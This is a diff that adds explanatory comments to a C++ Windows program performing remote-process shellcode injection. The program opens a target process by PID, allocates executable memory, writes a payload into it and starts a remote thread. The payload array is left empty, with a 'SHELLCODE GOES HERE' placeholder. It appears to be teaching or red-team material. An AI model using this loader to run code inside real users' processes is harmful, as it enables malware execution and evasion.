@@ -2,10 +2,12 @@
 #include <iostream>
 
 int main(int argc, char* argv[]) {
+	// Initialize our variables to NULL
 	DWORD PID = NULL;
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
 	LPVOID rBuffer = NULL;
+	// SHELLCODE GOES HERE
 	unsigned char payload[] = "";
 	
 	// Make sure an argument is supplied
@@ -18,12 +20,14 @@ int main(int argc, char* argv[]) {
 	PID = atoi(argv[1]);
 	printf("Attempting to open a handle to process PID: %ld\n", PID);
 
+	// Get a handle to our process
 	hProcess = OpenProcess(
 		PROCESS_ALL_ACCESS, // Lets request all access
 		FALSE, // Don't need to inherit handles
 		PID // Supply our PID
 	);
 
+	// Check for success
 	if (hProcess == NULL) {
 		printf("Failed to get handle to process!\n");
 		return EXIT_FAILURE;
@@ -32,6 +36,7 @@ int main(int argc, char* argv[]) {
 		printf("Succesfully got handle to process at address 0x%p\n", hProcess);
 	}
 
+	// Allocate our memory space based on the size of our payload
 	rBuffer = VirtualAllocEx(
 		hProcess, // Pass the handle of the target process
 		NULL,
@@ -39,6 +44,7 @@ int main(int argc, char* argv[]) {
 		MEM_RESERVE | MEM_COMMIT, // The type of allocation. We need to reserve and commit memory
 		PAGE_EXECUTE_READWRITE // We need permission to read, write, and execute the payload we inject
 	);
+	// Check for success
 	if (rBuffer == NULL)
 	{
 		printf("Failed to allocate memory to process!\n");
@@ -49,6 +55,7 @@ int main(int argc, char* argv[]) {
 		printf("Succesfully allocated %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);
 	}
 
+	// Write our payload to our allocated memory space
 	WriteProcessMemory(
 		hProcess, // Process handle
 		rBuffer, // Pointer to base address
@@ -58,6 +65,7 @@ int main(int argc, char* argv[]) {
 	);
 	printf("Succesfully wrote %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);
 
+	// Create new thread from injected process to execute our payload
 	hThread = CreateRemoteThreadEx(
 		hProcess, // Handle to our injected process
 		NULL,
@@ -68,7 +76,7 @@ int main(int argc, char* argv[]) {
 		0,
 		NULL
 	);
-
+	// Check for success
 	if (hThread == NULL) {
 		printf("Failed to get handle to remote thread!\n");
 		CloseHandle(hProcess);
